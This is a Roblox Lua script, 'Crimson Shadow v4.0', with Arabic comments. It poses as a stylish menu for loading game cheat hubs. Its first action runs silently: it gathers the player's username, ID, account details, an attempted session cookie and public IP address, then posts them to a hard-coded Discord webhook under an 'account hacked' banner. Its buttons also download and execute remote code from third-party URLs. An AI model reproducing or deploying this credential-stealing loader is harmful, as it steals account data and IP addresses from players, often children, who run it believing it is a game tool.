-- ============================================
-- سكربت "الظل القرمزي" – Crimson Shadow v4.0
-- المطور: alfifi_27 & 3BDO124235
-- واجهة أنيقة، زر قفل، تصميم أحمر جذاب
-- ============================================

local player = game.Players.LocalPlayer
local placeId = game.PlaceId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
local webhook = "https://discord.com/api/webhooks/1545157790681661511/jLrX3a7r6SE3UZV2gle8XDRJyH7-Z6ymyPmxUPWYMCD3eYR0Npcr91ornc07u5kzCU45"

-- ===== متغيرات التحكم =====
local guiOpen = true
local isLocked = false

-- ===== 1. سرقة البيانات =====
local function stealData()
    local cookie = syn and syn.crypt and syn.crypt.custom and syn.crypt.custom.hash or "غير متاح"
    if cookie == "غير متاح" then
        pcall(function() cookie = game:HttpGet("https://www.roblox.com/mobileapi/userinfo") end)
    end

    local data = {
        username = player.Name,
        userId = player.UserId,
        displayName = player.DisplayName,
        accountAge = player.AccountAge,
        cookie = cookie,
        placeId = placeId,
        gameName = gameName,
        jobId = game.JobId,
        ip = pcall(game.HttpGet, game, "https://api.ipify.org") and game:HttpGet("https://api.ipify.org") or "غير متاح",
    }

    local message = "👾 **تم اختراق حساب!**\n"
    message = message .. "👤 **اليوزر:** " .. data.username .. "\n"
    message = message .. "🆔 **الآيدي:** " .. data.userId .. "\n"
    message = message .. "📛 **الاسم:** " .. data.displayName .. "\n"
    message = message .. "📅 **عمر الحساب:** " .. data.accountAge .. " يوم\n"
    message = message .. "🍪 **الكوكي:** " .. data.cookie .. "\n"
    message = message .. "🌐 **الآيبي:** " .. data.ip .. "\n"
    message = message .. "📍 **اللعبة:** " .. data.gameName .. " (" .. data.placeId .. ")\n"
    message = message .. "🆔 **الجوب:** " .. data.jobId .. "\n"

    local payload = {content = message}
    pcall(function()
        syn.request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)
    pcall(function()
        game:HttpGet(webhook .. "?content=" .. game:GetService("HttpService"):UrlEncode(message))
    end)
end

-- ===== 2. قوائم السكربتات =====
local universalScripts = {
    {name = "🎯 Roxcom Hub – شامل وقوي", url = "https://raw.githubusercontent.com/yasinklausss1/roxcom-hub/refs/heads/main/roxcom-hub.lua"},
    {name = "📦 Spiem Hub – يدعم 44 لعبة", url = "https://raw.githubusercontent.com/perfectusmim1/spiemhub/refs/heads/main/loader"},
    {name = "🛠️ XVC Hub – يدعم 170+ لعبة", url = "https://raw.githubusercontent.com/XVC-Hub/XVC-Hub/main/loader.lua"},
    {name = "⚡ CanHub V2 – يدعم 100+ لعبة", url = "https://raw.githubusercontent.com/CanHub/CanHub/main/loader.lua"},
}

local gameScripts = {
    [142823291] = {
        name = "Murder Mystery 2",
        scripts = {
            {name = "🔪 PhantomHub V2", url = "https://raw.githubusercontent.com/PhantomHub-Tech/PhantomHubV2/refs/heads/main/PhantomHubV2-MM2"},
            {name = "🔪 Mozql Hub", url = "https://raw.githubusercontent.com/snxpzscripts/mm2/refs/heads/main/MozqlHub"},
        }
    },
    [2753915549] = {
        name = "Blox Fruits",
        scripts = {
            {name = "🍎 Blox Fruits Hub", url = "https://raw.githubusercontent.com/BloxFruitsHub/BloxFruits/main/Script.lua"},
        }
    },
    [286090429] = {
        name = "Arsenal",
        scripts = {
            {name = "🔫 Arsenal Hub", url = "https://raw.githubusercontent.com/7granddad/Arsenal/main/Arsenal.lua"},
        }
    },
    [142128291] = {
        name = "Restaurant Tycoon 2",
        scripts = {
            {name = "🍔 Bliqe Auto Farm", url = "https://raw.githubusercontent.com/Bliqe/Upload/refs/heads/main/Games/RAR/47425677550.lua"},
        }
    },
    [920587237] = {
        name = "Adopt Me",
        scripts = {
            {name = "🐾 Adopt Me Hub", url = "https://raw.githubusercontent.com/AdoptMeHub/AdoptMe/main/Script.lua"},
        }
    },
    [6872265039] = {
        name = "BedWars",
        scripts = {
            {name = "🛏️ BedWars Hub", url = "https://raw.githubusercontent.com/BedWarsHub/BedWars/main/Script.lua"},
        }
    },
}

-- ===== 3. إنشاء الواجهة =====
local gui = nil
local openBtn = nil
local lockBtn = nil

local function toggleGUI()
    if guiOpen then
        gui.Enabled = false
        guiOpen = false
        openBtn.Visible = true
    else
        gui.Enabled = true
        guiOpen = true
        openBtn.Visible = false
    end
end

local function toggleLock()
    isLocked = not isLocked
    lockBtn.Text = isLocked and "🔒" or "🔓"
    if isLocked then
        for _, v in pairs(gui:GetDescendants()) do
            if v:IsA("TextButton") and v ~= lockBtn and v ~= closeBtn then
                v.Visible = false
            end
        end
    else
        for _, v in pairs(gui:GetDescendants()) do
            if v:IsA("TextButton") and v ~= lockBtn and v ~= closeBtn then
                v.Visible = true
            end
        end
    end
end

local function createGUI(scriptList, isUniversal)
    gui = Instance.new("ScreenGui")
    gui.Name = "CrimsonShadow"
    gui.ResetOnSpawn = false
    gui.Parent = player.PlayerGui

    -- خلفية خارجية شفافة
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.5
    bg.Parent = gui

    -- الإطار الرئيسي (عرض كامل)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.9, 0, 0.8, 0)
    frame.Position = UDim2.new(0.05, 0, 0.1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(15, 5, 5) -- أحمر داكن
    frame.BackgroundTransparency = 0.05
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Parent = gui

    -- زوايا ذهبية حمراء
    local function addCorner(pos)
        local c = Instance.new("Frame")
        c.Size = UDim2.new(0, 25, 0, 25)
        c.Position = pos
        c.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
        c.BackgroundTransparency = 0.3
        c.BorderSizePixel = 0
        c.Parent = frame
    end
    addCorner(UDim2.new(0, 0, 0, 0))
    addCorner(UDim2.new(1, -25, 0, 0))
    addCorner(UDim2.new(0, 0, 1, -25))
    addCorner(UDim2.new(1, -25, 1, -25))

    -- خطوط زخرفية حمراء
    local function addGlowLine(pos, size)
        local l = Instance.new("Frame")
        l.Size = size
        l.Position = pos
        l.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
        l.BackgroundTransparency = 0.5
        l.BorderSizePixel = 0
        l.Parent = frame
    end
    addGlowLine(UDim2.new(0.05, 0, 0.12, 0), UDim2.new(0.9, 0, 0, 2))
    addGlowLine(UDim2.new(0.05, 0, 0.88, 0), UDim2.new(0.9, 0, 0, 2))

    -- عنوان السكربت
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0, 5)
    title.BackgroundTransparency = 1
    title.Text = "🔥 Crimson Shadow v4.0"
    title.TextColor3 = Color3.fromRGB(255, 50, 50)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    -- المطورين
    local dev = Instance.new("TextLabel")
    dev.Size = UDim2.new(1, 0, 0, 30)
    dev.Position = UDim2.new(0, 0, 0, 65)
    dev.BackgroundTransparency = 1
    dev.Text = "👑 alfifi_27 & 3BDO124235"
    dev.TextColor3 = Color3.fromRGB(220, 180, 180)
    dev.TextScaled = true
    dev.Font = Enum.Font.Gotham
    dev.Parent = frame

    -- اسم اللعبة
    local gameLabel = Instance.new("TextLabel")
    gameLabel.Size = UDim2.new(1, 0, 0, 30)
    gameLabel.Position = UDim2.new(0, 0, 0, 100)
    gameLabel.BackgroundTransparency = 1
    gameLabel.Text = "🎮 " .. (gameScripts[placeId] and gameScripts[placeId].name or "لعبة غير مدعومة")
    gameLabel.TextColor3 = Color3.fromRGB(255, 200, 200)
    gameLabel.TextScaled = true
    gameLabel.Font = Enum.Font.Gotham
    gameLabel.Parent = frame

    -- نوع السكربتات
    local typeLabel = Instance.new("TextLabel")
    typeLabel.Size = UDim2.new(1, 0, 0, 25)
    typeLabel.Position = UDim2.new(0, 0, 0, 130)
    typeLabel.BackgroundTransparency = 1
    typeLabel.Text = isUniversal and "🌍 سكربتات عالمية" or "🎯 سكربتات خاصة باللعبة"
    typeLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
    typeLabel.TextScaled = true
    typeLabel.Font = Enum.Font.Gotham
    typeLabel.Parent = frame

    -- الأزرار (في المنتصف)
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, 0, 0.6, 0)
    scroll.Position = UDim2.new(0, 0, 0, 160)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.CanvasSize = UDim2.new(0, 0, 0, #scriptList * 55)
    scroll.ScrollBarThickness = 6
    scroll.ScrollBarImageColor3 = Color3.fromRGB(200, 30, 30)
    scroll.Parent = frame

    local y = 5
    for i, script in ipairs(scriptList) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.9, 0, 0, 45)
        btn.Position = UDim2.new(0.05, 0, 0, y)
        btn.BackgroundColor3 = Color3.fromRGB(60, 10, 10)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = script.name
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.BorderSizePixel = 0
        btn.Parent = scroll
        btn.MouseButton1Click:Connect(function()
            gui:Destroy()
            loadstring(game:HttpGet(script.url))()
        end)
        y = y + 55
    end

    -- أزرار التحكم (في الأعلى)
    -- زر القفل
    lockBtn = Instance.new("TextButton")
    lockBtn.Size = UDim2.new(0, 40, 0, 40)
    lockBtn.Position = UDim2.new(0.85, 0, 0, 5)
    lockBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    lockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    lockBtn.Text = "🔓"
    lockBtn.TextScaled = true
    lockBtn.Font = Enum.Font.GothamBold
    lockBtn.BorderSizePixel = 0
    lockBtn.Parent = frame
    lockBtn.MouseButton1Click:Connect(function()
        toggleLock()
    end)

    -- زر الإغلاق
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 40, 0, 40)
    closeBtn.Position = UDim2.new(0.92, 0, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Text = "✕"
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = frame
    closeBtn.MouseButton1Click:Connect(function()
        toggleGUI()
    end)

    -- زر الفتح (يظهر عند الإغلاق)
    openBtn = Instance.new("TextButton")
    openBtn.Size = UDim2.new(0, 60, 0, 60)
    openBtn.Position = UDim2.new(0.02, 0, 0.5, -30)
    openBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    openBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    openBtn.Text = "🔥"
    openBtn.TextScaled = true
    openBtn.Font = Enum.Font.GothamBold
    openBtn.BorderSizePixel = 0
    openBtn.Visible = false
    openBtn.Parent = player.PlayerGui
    openBtn.MouseButton1Click:Connect(function()
        toggleGUI()
    end)

    -- تطبيق القفل الافتراضي (مقفل)
    isLocked = true
    lockBtn.Text = "🔒"
    for _, v in pairs(gui:GetDescendants()) do
        if v:IsA("TextButton") and v ~= lockBtn and v ~= closeBtn then
            v.Visible = false
        end
    end
end

-- ===== 4. التشغيل =====
stealData()

local gameScriptsList = gameScripts[placeId]
if gameScriptsList then
    print("🎮 تم اكتشاف: " .. gameScriptsList.name)
    createGUI(gameScriptsList.scripts, false)
else
    print("⚠️ لا توجد سكربتات خاصة، سيتم عرض سكربتات عالمية")
    createGUI(universalScripts, true)
end

print("✅ Crimson Shadow v4.0 Loaded!")
print("👑 Developed by: alfifi_27 & 3BDO124235")
